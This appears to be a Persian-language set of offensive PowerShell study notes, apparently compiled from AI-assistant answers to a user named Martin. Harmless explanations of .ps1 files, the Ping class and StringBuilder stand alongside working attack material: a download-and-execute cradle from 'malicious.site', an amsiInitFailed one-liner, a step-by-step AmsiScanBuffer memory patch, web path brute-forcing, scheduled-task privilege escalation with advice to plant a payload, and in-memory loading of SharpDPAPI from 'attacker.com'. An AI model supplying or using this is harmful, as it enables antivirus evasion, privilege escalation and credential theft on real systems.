|**PowerView**|ابزار شناسایی و تحلیل دامنه (Active Directory)|✅ بهترین در AD Recon|

---

## 📦 چند ابزار مکمل معروف:

|ابزار|توضیح|
|---|---|
|**PowerShellMafia**|تیم پشت PowerSploit|
|**PewPewPew**|اجرای دستور از راه دور از طریق WinRM|
|**GhostPack**|مجموعه ابزارهای C# (مثل Rubeus, Seatbelt) ولی مفاهیمش در PowerShell هم پیاده‌سازی می‌شن|
|**Invoke-Obfuscation**|ابزار حرفه‌ای برای obfuscate کردن اسکریپت‌های PowerShell (بسیار پرکاربرد در bypass AV)|
|**PowerLessShell**|اجرای shell بدون استفاده مستقیم از PowerShell.exe (جهت فرار از مانیتورینگ)|

---

## 💡 نکات کاربردی:

- **بسیاری از این ابزارها با هم ترکیب می‌شن**؛ مثلاً می‌تونی از Nishang یه reverse shell بگیری، و از PowerView برای شناسایی دامنه استفاده کنی.
    
- برخی از ابزارها مثل **Empire یا PoshC2** کلاینت/سرور دارند و می‌تونن ارتباط مداوم با سیستم هدف داشته باشن.
    
- ابزارهایی مثل **Invoke-Obfuscation** بیشتر برای مخفی‌سازی و دور زدن دفاع‌ها استفاده می‌شن.
    

---

## 🎓 اگر تازه شروع کردی...

بهتره این مسیر رو طی کنی:

1. یادگیری پایه PowerShell و execution policyها
    
2. کار با **Nishang**, **PowerSploit**, **PowerView**
    
3. استفاده از **Empire** یا **PoshC2** برای سناریوهای کامل
    
4. کار با **Obfuscation و Evasion** برای bypass دفاعی‌ها
    

---

---

## 🔹 1. فایل `.ps1` چیست؟

📄 **PowerShell Script File**

این فایل، **همون اسکریپت اصلی PowerShell** هست که می‌تونه شامل:

- دستورات اجرایی
    
- توابع
    
- شرط‌ها
    
- حلقه‌ها
    
- فراخوانی ابزارها  
    و... باشه.
    

### ✅ کاربرد:

- اجرای مستقیم کد PowerShell
    
- معمولاً برای automation، حمله، پویش، ارتباط و... استفاده می‌شه
    

### 🧪 مثال:

```powershell
Write-Host "Hello, this is a .ps1 file"
Get-Process
```

🧰 اجرا با دستور:

```powershell
.\myscript.ps1
```

---

## 🔹 2. فایل `.psd1` چیست؟

📄 **PowerShell Data File (Manifest)**

این فایل‌ها ساختاری شبیه **دیکشنری (hashtable)** دارند و معمولاً برای **ذخیره‌سازی داده‌های ساختاریافته** استفاده می‌شن، نه اجرای کد.

### ✅ کاربرد:

- تعریف **Module Manifest** برای ماژول‌ها (مثلاً تعریف نسخه، نام، وابستگی‌ها و توابع export شده)
    
- یا برای **تنظیمات پیکربندی جدا از اسکریپت اصلی**
    
- گاهی به عنوان فایل پیکربندی برای `.ps1` استفاده می‌شه
    

### 🧪 مثال:

```powershell
@{
    ModuleVersion = '1.0.0.0'
    Author = 'Martin'
    FunctionsToExport = @('Get-Info', 'Run-Scan')
}
```

🧰 بارگذاری در ماژول:

```powershell
Import-Module MyModule.psd1
```

---

## 📌 جدول مقایسه:

|ویژگی|`.ps1`|`.psd1`|
|---|---|---|
|نوع فایل|اسکریپت اجرایی|فایل داده/تنظیمات|
|محتوای اصلی|دستورات PowerShell|Hashtable (کلید/مقدار)|
|استفاده اصلی|اجرای کد|پیکربندی ماژول یا تنظیمات|
|اجراپذیر؟|✅ بله|❌ خیر|
|استفاده در ماژول؟|به عنوان عملکرد|به عنوان مانفیست (manifest)|

---

## 🎯 جمع‌بندی:

- فایل `.ps1` = **قلب اجرایی کد**
    
- فایل `.psd1` = **مغز تنظیمات و ساختار ماژول**
    

---
سؤال بسیار خوبی پرسیدی! آبجکت `System.Net.NetworkInformation.Ping` در PowerShell بهت اجازه می‌ده که **بسته‌های ICMP (پینگ)** رو به‌صورت **برنامه‌نویسی‌شده و دقیق‌تر از `Test-Connection`** ارسال کنی.

---

## 🧠 چی هست؟

`System.Net.NetworkInformation.Ping` یک **کلاس از فضای نام .NET Framework** هست که به PowerShell این امکان رو می‌ده که به روشی شی‌ء‌گرا (Object-Oriented) پینگ انجام بده.

---

## ✅ چرا از این استفاده کنیم؟

برخلاف `Test-Connection` که فقط برای اجرای سریع پینگ کاربرد داره، این کلاس بهت اجازه می‌ده:

- مشخص کنی چند میلی‌ثانیه صبر کنه (timeout)
    
- مقدار دقیق round-trip time رو بگیری
    
- با کد کنترل شده‌ای نتیجه‌ها رو پردازش کنی
    
- خروجی ساختار‌یافته‌تری داشته باشی
    
- کدهای شرطی بنویسی بر اساس نتیجه پینگ (Success, TimedOut, ...)
    

---

## 📦 استفاده ساده در PowerShell:

### ✅ 1. ساختن یک شی‌ء از کلاس `Ping`:

```powershell
$ping = New-Object System.Net.NetworkInformation.Ping
```

### ✅ 2. ارسال پینگ:

```powershell
$result = $ping.Send("8.8.8.8")
```

### ✅ 3. نمایش نتیجه:

```powershell
$result.Status         # Success, TimedOut, ...
$result.RoundtripTime  # زمان رفت و برگشت
$result.Address        # آدرس پاسخ‌دهنده
```

---

## 🧪 مثال کامل:

```powershell
$ping = New-Object System.Net.NetworkInformation.Ping
$target = "google.com"
$response = $ping.Send($target)

if ($response.Status -eq "Success") {
    Write-Host "پینگ موفق به $target"
    Write-Host "زمان رفت و برگشت: $($response.RoundtripTime) ms"
} else {
    Write-Host "پینگ ناموفق: $($response.Status)"
}
```

---

## 🔧 گزینه‌های اضافی در `.Send()`:

```powershell
Send(string host, int timeout, byte[] buffer, PingOptions options)
```

🔹 می‌تونی:

- Timeout مشخص کنی (مثلاً 1000 میلی‌ثانیه)
    
- Payload اختصاصی بفرستی
    
- TTL و تنظیمات fragmentation رو کنترل کنی با `PingOptions`
    

---

## 📘 اگر بخوای نسخه async (غیرهمزمان) هم داره:

```powershell
$ping.SendAsync("8.8.8.8", $null)
```

---

## 📌 مقایسه با `Test-Connection`:

|ویژگی|`System.Net.NetworkInformation.Ping`|`Test-Connection`|
|---|---|---|
|قابلیت کدنویسی دقیق|✅ بله|❌ کمتر|
|خروجی ساختاریافته|✅ بله|✅ (تا حدی)|
|مناسب برای اسکریپت‌های خودکار|✅ خیلی مناسب|✅ معمولی|
|ساده برای کاربر مبتدی|❌ پیچیده‌تر|✅ ساده‌تر|

---

## ✅ جمع‌بندی:

- `System.Net.NetworkInformation.Ping` برای **اسکریپت‌نویسی حرفه‌ای‌تر** بسیار مفید و قدرتمنده.
    
- بهت اجازه می‌ده کنترل کامل روی پینگ داشته باشی.
    
- برای پروژه‌هایی که نیاز به بررسی اتصالات شبکه دارن یا مانیتورینگ دستگاه‌ها عالیه.
    


---

## 🛡️ AMSI چیست؟

### ✅ **AMSI = Antimalware Scan Interface**

> یک رابط (API) **امنیتی داخلی در ویندوز** که به نرم‌افزارهای آنتی‌ویروس و EDR اجازه می‌ده **اسکریپت‌ها و کدهای اجراشده را پیش از اجرا بررسی و شناسایی کنند.**

---

## 📌 دقیق‌تر یعنی چی؟

- وقتی یه اسکریپت مثلاً PowerShell یا JavaScript اجرا می‌شه، **قبل از اجرا، محتواش توسط AMSI به آنتی‌ویروس تحویل داده می‌شه**.
    
- آنتی‌ویروس بررسی می‌کنه ببینه کد مشکوک یا مخرب هست یا نه.
    
- اگر تشخیص بده که کد مخربه، **اجراش متوقف می‌شه** یا هشدار داده می‌شه.
    

---

## 💥 AMSI برای مقابله با چه نوع حملاتی طراحی شده؟

|نوع حمله|مثال|
|---|---|
|**Fileless Malware**|اجرای Mimikatz با PowerShell بدون فایل روی دیسک|
|**Obfuscated Scripts**|اسکریپت‌هایی که رمزگذاری شدن (base64، XOR و...)|
|**Living-off-the-Land**|استفاده از ابزارهای داخلی مثل `rundll32`, `powershell.exe`, `mshta.exe`|

---

## 🧪 مثال: AMSI در PowerShell

```powershell
Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/mimikatz.ps1')"
```

حتی اگر این دستور **در حافظه** باشه، AMSI می‌تونه محتوای کد رو پیش از اجرا ببینه و به آنتی‌ویروس بده.

---

## 🎯 هدف AMSI:

- جلوگیری از اجرای **کدهای مخرب و مشکوک** حتی اگر روی دیسک ذخیره نشده باشن.
    
- کمک به **EDRها و آنتی‌ویروس‌ها** برای بازرسی رفتارهای runtime.
    

---

## ⚠️ دور زدن AMSI؟ (AMSI Bypass)

بسیاری از ابزارهای offensive مثل **Nishang، PowerSploit، Cobalt Strike، Empire** تلاش می‌کنن **AMSI رو غیرفعال کنن یا دور بزنن**.

مثلاً این تکنیک معروف:

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

🔴 این خط باعث می‌شه AMSI به‌صورت دستی غیر فعال بشه و هیچ اسکن دیگه‌ای انجام نشه.

⚠️ اما ویندوزهای جدیدتر و آنتی‌ویروس‌های مدرن مثل Defender یا EDRها مثل CrowdStrike یا SentinelOne معمولاً این تلاش‌ها رو شناسایی می‌کنن.

---

## 🧩 جمع‌بندی:

|ویژگی|توضیح|
|---|---|
|✅ تعریف|AMSI = رابطی برای اسکن کدهای اسکریپت قبل از اجرا|
|🎯 هدف|مقابله با کدهای fileless و حملات اسکریپتی|
|📦 پشتیبانی شده در|PowerShell, VBScript, JavaScript, Office Macros و ...|
|🛠️ ابزارهایی که ازش استفاده می‌کنن|Windows Defender، EDRها (مثل CrowdStrike)|
|🔓 قابل Bypass هست؟|بله، ولی در ویندوز جدید سخت‌تر شده|

---
سؤال حرفه‌ای پرسیدی 👏 چون حالا از "AMSI چیه" رفتی به این‌که "چطور باهاش تعامل کنیم" — دقیقاً همون کاری که توسعه‌دهنده‌ی آنتی‌ویروس‌ها و گاهی مهاجم‌ها انجام می‌دن.

---

## ✅ چطور می‌شه با AMSI ارتباط برقرار کرد؟

برای ارتباط با AMSI، باید از **APIهای سطح پایین ویندوز (Windows API)** استفاده کنی. معمولاً این کار با زبان‌هایی مثل **C یا C++** انجام می‌شه، ولی از طریق **C# یا حتی PowerShell با P/Invoke** هم قابل دسترسیه.

---

## 📦 مراحل کلی برای ارتباط با AMSI:

### 1. **بارگذاری کتابخانه AMSI**

```c
#include <windows.h>
#include <amsi.h>
```

### 2. **ایجاد context با `AmsiInitialize`**

```c
AMSI_CONTEXT amsiContext;
AmsiInitialize(L"MyAppName", &amsiContext);
```

### 3. **ایجاد session با `AmsiOpenSession`**

```c
AMSI_SESSION amsiSession;
AmsiOpenSession(amsiContext, &amsiSession);
```

### 4. **اسکن داده با `AmsiScanBuffer` یا `AmsiScanString`**

```c
AMSI_RESULT result;
AmsiScanString(amsiContext, L"powershell malicious code", L"MyScript", amsiSession, &result);
```

### 5. **بررسی نتیجه**

```c
if (AmsiResultIsMalware(result)) {
    printf("Malicious code detected!\n");
}
```

### 6. **پاکسازی**

```c
AmsiCloseSession(amsiContext, amsiSession);
AmsiUninitialize(amsiContext);
```

---

## 🧪 معادل خیلی ساده در C# (با P/Invoke):

```csharp
[DllImport("amsi.dll", CharSet = CharSet.Unicode)]
public static extern int AmsiInitialize(string appName, out IntPtr context);

[DllImport("amsi.dll", CharSet = CharSet.Unicode)]
public static extern int AmsiScanString(
    IntPtr context,
    string buffer,
    string contentName,
    IntPtr session,
    out int result);
```

🔸 این توابع به تو اجازه می‌دن از داخل برنامه‌ی C# یا C++ اسکریپت‌ها رو اسکن کنی.

---

## 🧠 نکات مهم:

|مورد|توضیح|
|---|---|
|✅ DLL مورد استفاده|`amsi.dll`|
|📍 تابع اصلی|`AmsiScanString` و `AmsiScanBuffer`|
|🧪 خروجی|`AMSI_RESULT` که می‌گه Safe یا Malicious|
|🔐 دسترسی سطح پایین|نیاز به بارگذاری مستقیم DLL|
|⚠️ خطر|اگر درست پیاده‌سازی نشه، ممکنه توسط مهاجم‌ها دور زده بشه یا خودش آسیب‌پذیر باشه|

---

## 🔓 مهاجم‌ها چطور از این API سوءاستفاده یا آن را دور می‌زنند؟

- بازنویسی حافظه `amsi.dll` در زمان اجرا
    
- تغییر مقدار متغیر `amsiInitFailed` (در PowerShell)
    
- Patch کردن `AmsiScanBuffer` یا `AmsiScanString` با مقدار برگشتی `AMSI_RESULT_CLEAN`
    

---

## 🧩 جمع‌بندی:

|مرحله|API|
|---|---|
|1. آماده‌سازی|`AmsiInitialize`|
|2. شروع جلسه|`AmsiOpenSession`|
|3. اسکن داده|`AmsiScanString` یا `AmsiScanBuffer`|
|4. نتیجه‌گیری|بررسی مقدار `AMSI_RESULT`|
|5. پایان|`AmsiCloseSession` و `AmsiUninitialize`|

---
[اگه خواستی، می‌تونم یه کد عملی با C یا C# برات بنویسم که خودش از AMSI برای اسکن یه رشته استفاده کنه.  
دوست داری نسخه کاملشو ببینی؟](<خیلی سؤال قوی‌ایه مارتین 🔥 چون وارد دنیای **پایین‌سطحی (low-level) در PowerShell** شدی، جایی که با حافظه، DLL و حتی hooking سروکار داریم. بذار خیلی دقیق و مرحله‌به‌مرحله توضیح بدم که:

---

## 🧠 هدف:

می‌خوای بدونی **چطور با PowerShell، محتویات `amsi.dll` رو ببینی** یا حتی **تغییری در اون بدی** (مثلاً برای بررسی یا Bypass کردنش).

---

## 🧰 ابزارهایی که می‌تونی استفاده کنی:

1. `Add-Type` یا `DllImport` برای فراخوانی توابع C از PowerShell
2. تابع `Get-ProcAddress` برای پیدا کردن آدرس توابع در DLL
3. استفاده از `VirtualProtect` برای تغییر حفاظت حافظه (مثلاً از ReadOnly به ReadWrite)
4. `Marshal` و `System.Reflection` برای نوشتن در حافظه

---

## ✅ مرحله 1: بارگذاری `amsi.dll` در حافظه

```powershell
$amsi = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer
```

یا راحت‌تر:

```powershell
$ptr = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE([System.Reflection.Assembly]::Load("amsi"))
```

ولی معمولاً برای توابع ویندوزی به شکل زیر استفاده می‌کنن:

```powershell
$module = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE([System.Reflection.Assembly]::LoadFile("C:\Windows\System32\amsi.dll"))
```

---

## ✅ مرحله 2: پیدا کردن تابع `AmsiScanBuffer`

برای این کار معمولاً از `GetProcAddress` استفاده می‌شه، که در PowerShell باید از API استفاده کنیم:

```powershell
$GetProcAddress = @"
[DllImport("kernel32.dll")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
"@ 

Add-Type -MemberDefinition $GetProcAddress -Namespace Win32 -Name Kernel32

$amsiDll = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE([System.Reflection.Assembly]::Load("amsi"))

$funcAddr = [Win32.Kernel32]::GetProcAddress($amsiDll, "AmsiScanBuffer")
```

---

## ✅ مرحله 3: تغییر محتویات تابع (مثلاً Bypass)

اینجا از `VirtualProtect` استفاده می‌کنیم تا بتونیم حافظه محافظت‌شده رو تغییر بدیم:

```powershell
$VirtualProtect = @"
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
"@

Add-Type -MemberDefinition $VirtualProtect -Name "Kernel32VirtualProtect" -Namespace "Win32"

# تنظیم اجازه نوشتن در حافظه
$oldProtect = 0
[Win32.Kernel32VirtualProtect]::VirtualProtect($funcAddr, 6, 0x40, [ref]$oldProtect)  # 0x40 = PAGE_EXECUTE_READWRITE
```

---

## ✅ مرحله 4: نوشتن کد در حافظه برای Bypass

در تکنیک‌های bypass معمولاً اولین بایت‌های تابع `AmsiScanBuffer` با کد زیر جایگزین می‌شن:

```powershell
[Byte[]] $patch = 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3  # mov eax,0x80070057; ret
```

بعد این رو به آدرس `AmsiScanBuffer` کپی می‌کنن:

```powershell
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $funcAddr, $patch.Length)
```

---

## 📌 نتیجه نهایی:

با این کار، تو عملکرد تابع `AmsiScanBuffer` رو تغییر دادی و باعث شدی همیشه مقدار خطا برگردونه که یعنی "هیچ تهدیدی نیست".

---

## 🛑 هشدار بسیار مهم:

* این کار **فقط باید در محیط تست یا آزمایشگاه انجام بشه.**
* هرگونه استفاده در سیستم‌های واقعی بدون مجوز می‌تونه **غیرقانونی و اخلاقاً نادرست** باشه.
* همچنین **EDRها و Windows Defender** در نسخه‌های جدید خیلی از این تکنیک‌ها رو شناسایی و بلاک می‌کنن.

---

## ✅ جمع‌بندی مراحل:

| مرحله | توضیح                                    |
| ----- | ---------------------------------------- |
| 1     | بارگذاری AMSI.dll                        |
| 2     | پیدا کردن آدرس تابع AmsiScanBuffer       |
| 3     | تغییر حفاظت حافظه با VirtualProtect      |
| 4     | نوشتن بایت‌های جدید در آدرس تابع (Patch) |
| 5     | AMSI Bypassed ✅                          |

---

#نکنه : 
اگر بخواهیم ببینمی که یک ماژول چه دستور هایی دارد میتونیم از 
این دستور استفاده کنیم 
```
Get-Command -Module posh-shodan
```
بعد از اینکه اومدیم و ماژول مد نظرومون رو import کریدم 
```import-module posh-shodan\posh-shodan.psd1```
میتونیم حالا بیایم و با استفاده "get-command" متود های اون ماژول رو صدار بزنیم یا با استفاده از Alias GM که cmdlet هست Get-Member بیایم و این کارو انجام بدیم 


حالا ما میتونیم بیایم و با یکی از فانکشن های پاورسپلویت که برای *Web Content Scanner* هست بیایم و یک 
$SCAN$ انجام بدیم 
```
import-module powersploit\recon\get-httpstatus.ps1

get-httpstatus -target amintijay.com -Path C:\users\charon\path_url.txt -port 80 
```

حالا ما داریم میگیم که بیا برای ما با سوییج تارگت بیا برو رو دامنه amintijay و از مسیر برو این path ها رو روی پورت 80 تست کن 
و هرکدوم از این path ها درست بود برای من نمایش بده 
Result: 
<< http://amintijay.com/admin >>
<< http://amintijay.com/admin1123 >>
<< http://amintijay.com/myadmin >>

And Other.........

میتونم بهتر بگم بیاد برای من اونایی که برابر بودن با OK یعنی درست بودن رو بیاد نشون بده 

```
get-httpstatus -target amintijay.com -Path C:\users\charon\path_url.txt -port 80 | where-object {$_.Status -match "ok"}
```

اینطوری میتونم بیام و فقط URL هایی روی ببینم که وجود دارند تا تو قدم بعدی بیشتر باهاش کار

---

## 🧩 وقتی تو اینو می‌نویسی:

```powershell
$new = New-Object System.Text.StringBuilder
```

یعنی چی؟

### 🔹 ۱. `New-Object`

دستور PowerShell برای **ساخت یک نمونه (instance) از یک کلاس دات‌نت (.NET class)** هست.

---

### 🔹 ۲. `System.Text.StringBuilder`

این دقیقاً اشاره داره به:

- **Namespace**: `System.Text`
    
- **Class**: `StringBuilder`
    
- این کلاس بخشی از **فریمورک دات‌نت** هست که برای ساخت و مدیریت کارآمد رشته‌های بزرگ (Strings) استفاده میشه.
    

---

## 🧠 ولی پشت صحنه چی میشه؟

در واقع PowerShell میره و به صورت داینامیک می‌گه:

> "هی! من می‌خوام از اسمبلی (DLL) مربوط به `System.Text` یه کلاس به نام `StringBuilder` رو لود و اجرا کنم."

در بیشتر موارد، این کلاس‌ها در یکی از این DLLهای معروف قرار دارن:

|Namespace|DLL (Assembly) که داخلشه|
|---|---|
|System.Text.*|`System.Private.CoreLib.dll` _(در .NET Core / PowerShell 7)_|
|System.*|`mscorlib.dll` یا `System.dll` _(در PowerShell 5/4 - .NET Framework)_|

---

## 🎯 پس جواب سؤالت:

> ❓ «آیا داریم کلاس داخل یک DLL مثل system.text.runtime رو فراخوانی می‌کنیم؟»

✅ **بله، دقیقاً.**  
تو داری از کلاس `System.Text.StringBuilder` که داخل یک **DLL دات‌نتی** قرار داره (مثل `System.Private.CoreLib.dll`) استفاده می‌کنی، ولی توی PowerShell نیاز نیست دستی اون DLL رو import کنی، چون:

- این DLLها جزو **Core Assemblies** هستن و **اتوماتیک لود می‌شن**.
    

---

## ✳️ نکته خیلی مهم:

اگه بخوای از یه DLL خاص یا سفارشی استفاده کنی که خودش خودکار لود نمیشه، باید با این دستور لودش کنی:

```powershell
Add-Type -Path "C:\path\to\YourLibrary.dll"
```

یا اگه داخل GAC (Global Assembly Cache) باشه:

```powershell
Add-Type -AssemblyName "System.Windows.Forms"
```

---

## 📌 جمع‌بندی

|مفهوم|توضیح|
|---|---|
|`New-Object System.Text.StringBuilder`|ساخت یک instance از کلاس `StringBuilder` در فضای نام `System.Text`|
|DLL پشت‌صحنه|معمولاً `System.Private.CoreLib.dll` یا `mscorlib.dll`|
|PowerShell چیکار می‌کنه؟|لود اتوماتیک DLL و ساخت آبجکت|
|اگر DLL سفارشی باشه؟|باید با `Add-Type` لودش کنی|

---
عالیه مارتین! 👨‍💻  
وقتی می‌خوای با `System.Net.NetworkInformation` کار کنی، در واقع داری با فضای اسمی (Namespace)‌ای در دات‌نت کار می‌کنی که برای **گرفتن اطلاعات شبکه** استفاده می‌شه؛ مثل:

- آداپتورها (interfaceها)
    
- آدرس‌های IP
    
- وضعیت شبکه
    
- اطلاعات پینگ و...
    

و چون گفتی می‌خوای اینو **توی PowerShell** استفاده کنی، دقیقاً راه‌ درستیه چون PowerShell می‌تونه مستقیم به کلاس‌های دات‌نت دسترسی داشته باشه.

---

## 🧭 قدم‌به‌قدم یادگیری `System.Net.NetworkInformation` در PowerShell:

---

### ✅ 1. دیدن تمام کلاس‌ها و اعضای namespace

```powershell
[System.Net.NetworkInformation.NetworkInterface] | Get-Member -Static
```

یا برای لیست متدهای شیء:

```powershell
[System.Net.NetworkInformation.NetworkInterface] | Get-Member
```

---

### ✅ 2. گرفتن لیست تمام کارت‌های شبکه (interfaceها)

```powershell
[System.Net.NetworkInformation.NetworkInterface]::GetAllNetworkInterfaces()
```

می‌تونی نتیجه رو در یک متغیر بریزی:

```powershell
$interfaces = [System.Net.NetworkInformation.NetworkInterface]::GetAllNetworkInterfaces()
```

---

### ✅ 3. نمایش وضعیت کارت‌ها

```powershell
foreach ($nic in $interfaces) {
    Write-Host "Name: $($nic.Name)"
    Write-Host "Type: $($nic.NetworkInterfaceType)"
    Write-Host "Status: $($nic.OperationalStatus)"
    Write-Host "--------------------------------"
}
```

---

### ✅ 4. گرفتن آدرس‌های IP مربوط به هر کارت

```powershell
foreach ($nic in $interfaces) {
    $ipProps = $nic.GetIPProperties()
    foreach ($addr in $ipProps.UnicastAddresses) {
        Write-Host "$($nic.Name): $($addr.Address)"
    }
}
```

---

### ✅ 5. پینگ کردن یک سیستم از طریق کلاس `Ping`

```powershell
$ping = New-Object System.Net.NetworkInformation.Ping
$reply = $ping.Send("8.8.8.8")

if ($reply.Status -eq "Success") {
    Write-Host "Ping OK! Time: $($reply.RoundtripTime) ms"
} else {
    Write-Host "Ping Failed"
}
```

---

### 💡 نکته تکمیلی:

تو PowerShell نیازی به import کردن namespace به‌صورت دستی نداری. فقط کافیه مثل بالا با `System.Net.NetworkInformation` از کلاس‌هاش استفاده کنی.

---


سؤال خیلی خوب و کاملاً عملی‌ایه مارتین! 👌 بیایم مرحله‌به‌مرحله بررسی کنیم که **چطور بین Scheduled Taskها تشخیص بدیم کدوم‌ها آسیب‌پذیرند.**

---

## **۱. چرا Scheduled Task می‌تونه آسیب‌پذیر باشه؟**

مهاجم‌ها از Scheduled Task سوءاستفاده می‌کنن برای:

- **Privilege Escalation:** اگر تسک با دسترسی بالاتر (مثلاً SYSTEM یا Admin) اجرا می‌شه ولی قابل دستکاری باشه.
    
- **Persistence:** ایجاد یا تغییر تسک برای اجرای کد مخرب بعد از ریبوت.
    
- **Defense Evasion:** اجرای بدافزار تحت نام یک تسک قانونی.
    

---

## **۲. معیارهای آسیب‌پذیری یک Scheduled Task**

وقتی با `Get-ScheduledTask` لیست رو می‌گیری، باید دنبال این موارد بگردی:

### **(الف) سطح دسترسی اجرا (RunAs)**

- اگر **RunAsUser = SYSTEM یا Administrator** باشه و تو به هر شکلی بتونی محتوا یا مسیر برنامه اجراشده رو تغییر بدی، این یک **Privilege Escalation** جدیه.
    

```powershell
Get-ScheduledTask | Select TaskName, State, @{n='RunAs';e={$_.Principal.UserId}}
```

### **(ب) مسیر فایل اجرایی (Action Path)**

- اگر تسک قراره یک **اسکریپت، EXE یا Bat** رو از مسیری اجرا کنه که **قابل نوشتن برای کاربر عادیه** → آسیب‌پذیر.
    
- مثال: اجرا از `C:\Users\Public\` یا فولدری که مجوز **Modify** داری.
    

```powershell
Get-ScheduledTask | ForEach-Object {
    $_.Actions | Select-Object Execute, Arguments
}
```

### **(ج) مجوزهای روی تسک**

- **Scheduled Task خودش** هم ACL داره. اگر تو بتونی تنظیماتش رو ویرایش کنی (با `icacls` یا `Get-Acl`)، می‌تونی Action رو تغییر بدی و کد خودت رو بذاری.
    

```powershell
icacls "C:\Windows\System32\Tasks\<TaskName>"
```

اگر **کاربر عادی** روی این فایل **Write** یا **Modify** داشته باشه → آسیب‌پذیر.

### **(د) استفاده از Service Account**

اگر تسک با **Service Account** اجرا می‌شه (مثل اکانت‌های بکاپ یا SQL) و تو بتونی اسکریپت یا باینری اون رو تغییر بدی، ممکنه بتونی ازش برای **Service Account Impersonation** استفاده کنی.

---

## **۳. ابزارها و روش‌های خودکار**

### **PowerShell + ACL Check**

یک اسکریپت ساده که:

1. لیست Scheduled Taskها رو می‌گیره.
    
2. مسیر فایل اجرایی رو بررسی می‌کنه.
    
3. اگر کاربر فعلی مجوز نوشتن داشته باشه → پرچم می‌زنه.
    

```powershell
$tasks = Get-ScheduledTask
foreach ($task in $tasks) {
    foreach ($action in $task.Actions) {
        if (Test-Path $action.Execute) {
            $acl = Get-Acl $action.Execute
            if ($acl.AccessToString -match "Everyone.*(Write|Modify)" -or
                $acl.AccessToString -match "$env:USERNAME.*(Write|Modify)") {
                Write-Host "[!] Vulnerable Task: $($task.TaskName) - $($action.Execute)"
            }
        }
    }
}
```

---

## **۴. نشانه‌های واضح آسیب‌پذیری**

- **Executable یا Script** در مسیرهایی مثل:
    
    - `C:\Users\Public\`
        
    - `%TEMP%`
        
    - `C:\ProgramData\`
        
- **RunAs SYSTEM** یا اکانت‌های پرقدرت.
    
- **مجوز Modify یا Write** برای کاربر عادی روی باینری یا خود تسک.
    

---

## **۵. چه کنیم بعدش؟**

وقتی تسک آسیب‌پذیر پیدا کردی:

- اگر هدفت **Privilege Escalation** باشه → باینری یا اسکریپت رو با Payload خودت جایگزین کن.
    
- اگر هدفت **Persistence** باشه → تسک رو به دلخواهت تغییر بده (زمان‌بندی یا Action).
    

---


### 🔹 **SharpDPAPI چیست؟**

SharpDPAPI یک ابزار **Post-Exploitation** هست که توسط _GhostPack_ ساخته شده و مخصوص مهاجمان یا تیم قرمز برای سوءاستفاده از **Windows DPAPI** طراحی شده.

---

### 📌 **DPAPI چیست؟**

**Data Protection API** یک مکانیزم داخلی ویندوز هست که برای رمزگذاری و رمزگشایی اطلاعات حساس استفاده می‌شود، مانند:

- گذرواژه‌های ذخیره‌شده مرورگرها (Chrome، Edge، IE)
    
- گذرواژه‌های ذخیره‌شده در Credential Manager
    
- کلیدهای رمزنگاری
    
- گذرواژه‌های Wi-Fi
    
- تنظیمات RDP و ...
    

ویندوز این داده‌ها را با کلیدی که از **کاربر یا سیستم** گرفته می‌شود رمزگذاری می‌کند.




مارتین، **SharpDPAPI** در اصل یک **فایل اجرایی (EXE)** هست که به زبان C# نوشته شده، ولی چون متن‌بازه، می‌تونی سورسش رو بگیری و هر جور بخوای کامپایلش کنی.

🔹 **ساختار و مکانیزم اجراش** به این صورته:

- سورس کدش با **.NET Framework** یا **.NET Core** کامپایل میشه → خروجی معمولاً یک **EXE** یا گاهی یک **DLL** قابل لود شدن با ابزارهای دیگه مثل Cobalt Strike.
    
- خودش یک **component داخلی ویندوز** نیست، یعنی به صورت پیش‌فرض روی سیستم وجود نداره.
    
- برای کارش از **APIهای داخلی ویندوز** (مثل `CryptUnprotectData`) استفاده می‌کنه تا داده‌های DPAPI رو رمزگشایی کنه.
    
- می‌تونه به صورت:
    
    1. **Standalone Executable** → مثل `SharpDPAPI.exe` که مستقیم اجرا می‌کنی.
        
    2. **Reflective DLL** → برای لود شدن داخل حافظه توسط ابزارهایی مثل `rundll32`, `Cobalt Strike Beacon`.
        
    3. **Inline C# code** → داخل ابزارهای دیگر GhostPack یا به صورت اسکریپت C#.
        

---

💡 خلاصه:  
به طور پیش‌فرض بیشتر افرادش رو به صورت **فایل اجرایی EXE** استفاده می‌کنن، ولی میشه همون کد رو به **DLL یا حتی ماژول C#** هم تبدیل کرد تا بدون ذخیره روی دیسک اجرا بشه.



مارتین، با پاورشل چند روش داری که بتونی **SharpDPAPI** رو اجرا یا باهاش تعامل کنی، بستگی داره که خروجی ابزار رو به چه شکلی داشته باشی (EXE یا DLL) و آیا میخوای روی دیسک ذخیره بشه یا فقط داخل حافظه لود بشه.

---

## **۱. اجرای مستقیم فایل EXE**

اگر SharpDPAPI رو به صورت `SharpDPAPI.exe` داری و روی سیستم ذخیره کردی:

```powershell
& "C:\Path\To\SharpDPAPI.exe" masterkeys
```

🔹 اینجا `&` یعنی «اجرا کردن برنامه».  
🔹 `masterkeys` یک سوییچ نمونه از SharpDPAPI هست.

---

## **۲. اجرای EXE از حافظه (بدون ذخیره روی دیسک)**

اگر نمیخوای فایل رو روی دیسک بندازی (برای ردگیری کمتر):

```powershell
$bytes = Invoke-WebRequest -Uri "http://attacker.com/SharpDPAPI.exe" -UseBasicParsing
[System.Reflection.Assembly]::Load($bytes.Content).EntryPoint.Invoke($null, @(@()))
```

🔹 این روش ابزار رو از طریق HTTP دانلود و مستقیم در حافظه لود می‌کنه.

---

## **۳. اجرای نسخه DLL با پاورشل**

اگر SharpDPAPI رو به DLL کامپایل کرده باشی:

```powershell
Add-Type -Path "C:\Path\To\SharpDPAPI.dll"
[SharpDPAPI.Program]::Main(@("masterkeys"))
```

🔹 `Add-Type` DLL رو لود می‌کنه و بعدش می‌تونی متد اصلی رو صدا بزنی.

---

## **۴. اجرای C# Inline با پاورشل**

